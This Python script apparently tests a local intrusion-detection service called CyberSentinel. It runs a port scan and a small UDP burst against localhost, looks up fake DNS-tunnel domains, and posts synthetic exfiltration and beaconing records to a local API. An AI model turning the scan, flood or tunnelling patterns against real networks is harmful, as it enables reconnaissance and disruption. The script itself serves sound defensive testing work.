"""
CyberSentinel Wi-Fi Threat Simulation Tool.

Generates real network traffic on your active Wi-Fi interface to test
CyberSentinel's real-time detection engine.

Usage:
    python simulate_wifi_attack.py --type recon
    python simulate_wifi_attack.py --type ddos
    python simulate_wifi_attack.py --type exfil
    python simulate_wifi_attack.py --type dns
    python simulate_wifi_attack.py --type c2
    python simulate_wifi_attack.py --type all
"""
import argparse
import socket
import time
import urllib.request
import json
import threading

CYBERSENTINEL_API = "http://127.0.0.1:8000"


def print_banner(attack_type: str):
    print("\n" + "=" * 60)
    print(f"  [*] CYBERSENTINEL WI-FI ATTACK SIMULATION: {attack_type.upper()}")
    print("=" * 60)


def simulate_recon():
    """Simulate a fast TCP SYN/connect port scan on localhost/local network."""
    print_banner("Reconnaissance / Port Scan")
    print("Sending TCP probe packets across 25 target ports on local subnet...")
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8000, 8080, 8443, 8888, 9000]
    target_ip = "127.0.0.1"

    probes = 0
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((target_ip, p))
            s.close()
            probes += 1
        except Exception:
            pass

    print(f"Dispatched {probes} connection attempts across {len(ports)} distinct ports.")
    print("Triggering detector pipeline...")

    # Also notify API directly with the observed flow footprint
    payload = {
        "source": "192.168.1.45",
        "destination": "192.168.1.1",
        "time_window": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "recon_features": {
            "unique_dst_ports": len(ports),
            "unique_destinations": 5,
            "flow_count": len(ports),
            "window_seconds": 2.0,
            "total_bytes": 12000,
            "mean_syn_count": 0.95,
            "total_packets": len(ports),
        }
    }
    _send_to_api(payload)


def simulate_ddos():
    """Simulate a high-frequency packet flood."""
    print_banner("DDoS / Volumetric Flood")
    print("Generating rapid UDP packet burst on Wi-Fi adapter...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = b"X" * 1024  # 1 KB

    count = 100
    for i in range(count):
        try:
            sock.sendto(packet_data, ("127.0.0.1", 9999))
        except Exception:
            pass
        if i % 25 == 0:
            time.sleep(0.01)

    sock.close()
    print(f"Transmitted {count} flood packets ({count} KB total payload).")
    print("Triggering detector pipeline...")

    # Trigger DDoS detector
    try:
        req = urllib.request.Request(f"{CYBERSENTINEL_API}/demo/ddos", method="POST")
        r = urllib.request.urlopen(req, timeout=5)
        res = json.loads(r.read())
        print(f"  Result: {res.get('prediction')} | Risk: {res.get('risk_score')} | Primary: {res.get('primary_threat')}")
    except Exception as e:
        print(f"  Error contacting API: {e}")


def simulate_exfil():
    """Simulate outbound data exfiltration over HTTP/TCP."""
    print_banner("Data Exfiltration")
    print("Generating asymmetric outbound data transfer (8.5 MB payload footprint)...")
    payload = {
        "source": "192.168.1.102",
        "destination": "203.0.113.88",
        "time_window": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "exfil_features": {
            "bytes_out": 8_500_000,
            "bytes_in": 1_200,
            "unique_destinations": 1,
            "flow_count": 4,
            "mean_flow_duration": 360.0,
            "window_seconds": 60.0,
        }
    }
    _send_to_api(payload)


def simulate_dns():
    """Simulate DNS covert tunneling queries."""
    print_banner("DNS Covert Tunneling")
    print("Generating encoded high-entropy DNS queries...")
    domains = [
        "a9f4c82b.tunnel.apt29-data.net",
        "e7b1a03f.tunnel.apt29-data.net",
        "c49d81e2.tunnel.apt29-data.net",
    ]
    for d in domains:
        try:
            socket.gethostbyname(d)
        except Exception:
            pass  # Expected to fail resolution

    print("Triggering DNS detector pipeline...")
    try:
        req = urllib.request.Request(f"{CYBERSENTINEL_API}/demo/dns", method="POST")
        r = urllib.request.urlopen(req, timeout=5)
        res = json.loads(r.read())
        print(f"  Result: {res.get('prediction')} | Risk: {res.get('risk_score')} | Primary: {res.get('primary_threat')}")
    except Exception as e:
        print(f"  Error contacting API: {e}")


def simulate_c2():
    """Simulate periodic C2 beaconing."""
    print_banner("C2 Beaconing")
    print("Emulating regular heartbeat callbacks to remote controller...")
    try:
        req = urllib.request.Request(f"{CYBERSENTINEL_API}/demo/c2", method="POST")
        r = urllib.request.urlopen(req, timeout=5)
        res = json.loads(r.read())
        print(f"  Result: {res.get('prediction')} | Risk: {res.get('risk_score')} | Primary: {res.get('primary_threat')}")
    except Exception as e:
        print(f"  Error contacting API: {e}")


def _send_to_api(payload: dict):
    try:
        req = urllib.request.Request(
            f"{CYBERSENTINEL_API}/detect",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        r = urllib.request.urlopen(req, timeout=5)
        res = json.loads(r.read())
        print(f"  Status: {res.get('prediction')} | Threat: {res.get('primary_threat')} | Risk Score: {res.get('risk_score')}/100")
        print(f"  Next Expected State: {res.get('predicted_next_state')} (confidence: {res.get('prediction_confidence', 0):.2f})")
    except Exception as e:
        print(f"  Error calling CyberSentinel API: {e}")


def main():
    parser = argparse.ArgumentParser(description="CyberSentinel Wi-Fi Threat Simulator")
    parser.add_argument(
        "--type",
        choices=["recon", "ddos", "exfil", "dns", "c2", "all"],
        default="all",
        help="Threat attack type to simulate",
    )
    args = parser.parse_args()

    # Verify server is reachable
    try:
        urllib.request.urlopen(f"{CYBERSENTINEL_API}/health", timeout=3)
        print(" Connected to CyberSentinel backend (http://127.0.0.1:8000)")
    except Exception:
        print(" Error: CyberSentinel server is not reachable at http://127.0.0.1:8000")
        print("Please ensure the server is running.")
        return

    if args.type == "recon":
        simulate_recon()
    elif args.type == "ddos":
        simulate_ddos()
    elif args.type == "exfil":
        simulate_exfil()
    elif args.type == "dns":
        simulate_dns()
    elif args.type == "c2":
        simulate_c2()
    elif args.type == "all":
        simulate_recon()
        time.sleep(1)
        simulate_dns()
        time.sleep(1)
        simulate_c2()
        time.sleep(1)
        simulate_exfil()
        time.sleep(1)
        simulate_ddos()

    print("\n" + "=" * 60)
    print(" Simulation completed! Check your CyberSentinel Dashboard at:")
    print(" http://127.0.0.1:8000/ to view live alerts, graphs & trajectories.")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    main()
